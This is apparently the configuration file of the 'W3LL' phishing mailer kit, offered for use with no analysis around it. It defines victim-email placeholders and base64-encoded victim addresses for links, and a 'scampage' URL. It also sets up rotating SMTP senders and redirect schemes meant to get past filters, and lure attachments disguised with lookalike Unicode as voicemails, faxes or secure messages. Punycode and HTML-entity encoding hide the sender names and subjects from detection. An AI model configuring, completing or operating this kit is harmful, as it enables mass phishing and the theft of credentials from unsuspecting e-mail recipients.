#################################################################W3LL CODE FUNCTION#################################################################

++w3ll_logo++ > show logo on letter
++w3ll_host++ > show victim email domain on letter
++w3ll_email++ > show victim email  on letter
++w3ll_email64++ > base64 encrypted victim email on letter
++w3ll_email64_urlencode++ base64 encrypted victim email on url
++w3ll_short++ > show scampage url on letter
++w3ll_smtp++ > show smtp frommail
++w3ll_subject++ show subject
++w3ll_randomip++ > show generated random ip on letter
++w3ll_frommail++ > show frommail
++w3ll_fromname++ > show fromname
++w3ll_randstring++ > show generated string on letter
++w3ll_number1++ > show generated 1 number on letter
++w3ll_number2++ > show generated 2 number on letter
++w3ll_number3++ > show generated 3 number on letter
++w3ll_number4++ > show generated 4 number on letter
++w3ll_number5++ > show generated 5 number on letter
++w3ll_number6++ > show generated 6 number on letter
++w3ll_number7++ > show generated 7 number on letter
++w3ll_number8++ > show generated 8 number on letter
++w3ll_number9++ > show generated 9 number on letter
++w3ll_number10++ > show generated 10 number on letter
++w3ll_year++ > show year format
++w3ll_date++ > show date format
++w3ll_time++ > show time format
++w3ll_country++ > show generated country name on letter
++w3ll_country_code++ > show generated country code on letter
++w3ll_random_os++ > show generated os on letter
++w3ll_user++ > show victim email user on letter
++w3ll_domain++ > show victim email domain on letter
++w3ll_domain1++ > show victim email domain name with first letter capital on letter
++w3ll_secret_email++ > show secret victim email on letter
++w3ll_smtp_user++ > show smtp user
++w3ll_domain2++ > show victim email domain name on letter
++w3ll_data_name++ > show generated name on letter
++w3ll_data_address++ > show generated address on letter
++w3ll_data_licenseplate++ > show generated license plate on letter
++w3ll_data_color++ > show generated color on letter
++w3ll_data_company++ > show generated company name on letter
++w3ll_data_credit_card_expire++ > show generated cc exp on letter
++w3ll_data_credit_card_number++ > show generated cc num on letter
++w3ll_data_credit_card_provider++ > show generated cc provider on letter
++w3ll_data_credit_card_security_code++ > show generated cc vcc on letter
++w3ll_data_file_name++ > show generated file name on letter
++w3ll_data_timezone++ > show generated timezone on letter
++w3ll_data_pricetag++ > show generated pricetag on letter
++w3ll_data_ascii_company_email++ > show generated ascii company email on letter
++w3ll_data_ascii_free_email++ > show generated ascii free email on letter
++w3ll_data_company_email++ > show generated company email on letter
++w3ll_data_domain_name++ > show generated domain name on letter
++w3ll_data_image_url++ > show generated image url on letter
++w3ll_data_ipv4++ > show generated ipv4 on letter
++w3ll_data_mac_address++ > show generated mac address on letter
++w3ll_data_job++ > show generated name job title letter
++w3ll_data_phone_number++ > show generated phone number on letter
++w3ll_data_secret_phone_number++ > show generated secret phone number on letter
++w3ll_data_ssn++ > show generated ssn on letter
++w3ll_data_chrome++ > show generated chrome useragent on letter
++w3ll_data_firefox++ > show generated firefox useragent on letter
++w3ll_data_safari++ > show generated safari useragent on letter
++w3ll_data_ios_platform_token++ > show generated ios platform on letter
++w3ll_data_year++ > show generated year on letter
++w3ll_data_month++ > show generated month on letter
++w3ll_data_day++ > show generated day on letter

#################################################################W3LL CODE FUNCTION#################################################################




#################################################################TOKEN SETTING#################################################################

[sender]

>  You can put your token from line bellow

token = YOUR TOKEN HERE!

#################################################################TOKEN SETTING#################################################################


#################################################################SMTP SETTING#################################################################

[smtp]

>  You can add multiple smtp by duplicate this line bellow (change the number from 0 sequentially)
>  You can use 3 diffrent smtp format
>  1. HOST,PORT,EMAIL,PASS
>  2. HOST:PORT EMAIL PASS
>  3. HOST|PORT|EMAIL|PASS

0 = HOST,PORT,EMAIL,PASS

#################################################################SMTP SETTING#################################################################


#################################################################FILE SETTING#################################################################

[settings]

>  You can set custom_image name from line bellow

default_logo = files/image/microsoft_PNG10.jpg

>  You can set letter name from line bellow

letter = files/letter/index.html

>  You can set mailist name from line bellow

maillist = files/mail_list/email.txt

>  You can set attachment name from line bellow

attachment = files/attachment/0.doc

#################################################################FILE SETTING#################################################################


#################################################################BASIC SETTING#################################################################

[users]

>  You can set sleeptime (delay per email) from line bellow

sleeptime = 1

>  If you want remove spammed email from your list change 0 to 1 on line bellow

remove_email = 0

>  You can set thread (email send per delay) from line bellow [default is the best!]

thread = default

>  You can change subject from this line bellow (use double comma as separator if you wanna use multiple subjects)

subject = SUBJECT

>  You can change link from this line bellow (use comma as separator if you wanna use multiple links)

scampage = LINK

>  You can change fromname from this line bellow (use comma as separator if you wanna use multiple fromnames)

fromname = FROMNAME

>  You can set your sender frommail from here (default = ++w3ll_smtp++)

frommail = ++w3ll_smtp++

>  You can set mail priority from line bellow (1 = Very Important | 2 = Important | 3 = Normal)

priority = 3

#################################################################BASIC SETTING#################################################################


#################################################################REDIRECT SETTING#################################################################
>  You can set redirect type from line bellow
>  0 = disable
>  1 = Use on link [?email=email base64]. 
>  2 = Use on link [?a=base64]. 
>  3 = Use on link [?email=email]. 
>  4 = Can use all shortlink including google redirect
>  5 = Use on link [#base64]. ==> FOR SENDGRID REDIRECT
>  6 = FOR W3LL PRIV PAGE
>  7 = Use on link [#email].
>  8 = Google ads redirect [Just for attacment and private page].
>  9 = Use W3ll.store official redirect
>  set it empty to send with manual page
redirect = 9
> You can set store username for redirect 9 option from line bellow
username = USERNAME
> You can set Store password for redirect 9 option from line bellow
password = PASSWORD
> You can set Store redirect id for redirect 9 option from line bellow
ids = ID
#################################################################REDIRECT SETTING#################################################################


#################################################################IMAGE SETTING#################################################################

>  Set 1 if you wanna enable custom image

custom_image = 0

>  custom image type (cid / base64)

logo = cid

#################################################################IMAGE SETTING#################################################################


#################################################################ATTACHMENT SETTING#################################################################

>  You can set attachment setting from line bellow (
>  0 = disable
>  1 = Send Attachment File With Random Name
>  2 = Send Attachment With Doc File
>  3 = Send Attachment With The Real Name/with attachment type )

filesend = 3

>  You can set attachment type from line bellow (
>  voicemail = Show 📞_𝙼𝚎𝚜𝚜𝚊𝚐𝚎 on attachment file name
>  remittance = Show Remittance on attachment file name
>  keep password = Show PASS_ID on attachment file name
>  message fail = Show Message Fail Delivered on attachment file name
>  fax = Show 𝙵‍a𝚡‍＿𝙸𝙳 on attachment file name
>  secure = Show 𝚂‍e𝚌‍𝚞‍𝚛‍e𝙼‍e𝚜‍𝚜‍a𝚐‍e on attachment file name
>  email = Show victim email on attachment file name
>  set it empty to send with real attachment file name )

filesend_type = voicemail

#################################################################ATTACHMENT SETTING#################################################################


#################################################################ENCODE SETTING#################################################################

>  Set 1 on line bellow to turn on fromname encode

fromname_encrypt = 0

>  You can set fromname encode type on line bellow (punnycode = Change all the letters to punycode letters | html_entities = Be able to encrypt all letter into html entities)

fromname_encode_type = html_entities

>  Set 1 on line bellow to turn on subject encode

subject_encrypt = 0

>  You can set subject encode type on line bellow (punnycode = Change all the letters to punycode letters | html_entities = Be able to encrypt all letter into html entities)

subject_encode_type = html_entities

#################################################################ENCODE SETTING#################################################################


#################################################################SELF TEST SETTING#################################################################

>  You can set line bellow to 1 to do test to your email

email_test = 0

>  You can set number bellow to send test email to your test email for each number set on line bellow

test_every = 100

>  You can set your email test from line bellow

email_destination = TEST EMAIL

#################################################################SELF TEST SETTING#################################################################


#################################################################CUSTOM HEADER SETTING#################################################################

>  set 1 to enable cusstom header

custom_header = 0

>  You can add multiple header by duplicate this line bellow (change the number from 0 sequentially)

[custom_header]

0 = HEADERS

#################################################################CUSTOM HEADER SETTING#################################################################


#################################################################ADVANCED SETTING#################################################################

>  Set 1 to use w3ll function on letter,subject, and  fromname

replacement = 1

>  You can set smtp debug from line bellow
>  0 = disable
>  1 = client>  will show you messages sent by the client
>  2 = client and server>  will add server messages, it’s the recommended setting.
>  3 = client, server, and connection>  will add information about the initial information, might be useful for discovering STARTTLS failures
>  4 = low-level information

debug_smtp = 0

> you can set reply to email on line bellow (leave it empty if you dont wanna use it)

reply_to = REPLY-TO

> You can set email charset from line bellow (utf-8)

charset = utf-8

> You can set letter encodinng from line bellow (base64/quoted-printable/8bit/7bit)

encoding = base64

> You can set smtp connection timeout from line bellow, if your smtp takes longger time to connect set it to default

timezone = America/New_York

> Timezones, Check here https://www.w3schools.com/php/php_ref_timezones.asp for zone formats

smtp_timeout = 5

> You can set line bellow to 1 to send only valid email

email_validation = 0

#################################################################ADVANCED SETTING#################################################################


#################################################################DO NOT CHANGE#################################################################

[session]

email = 0

#################################################################DO NOT CHANGE#################################################################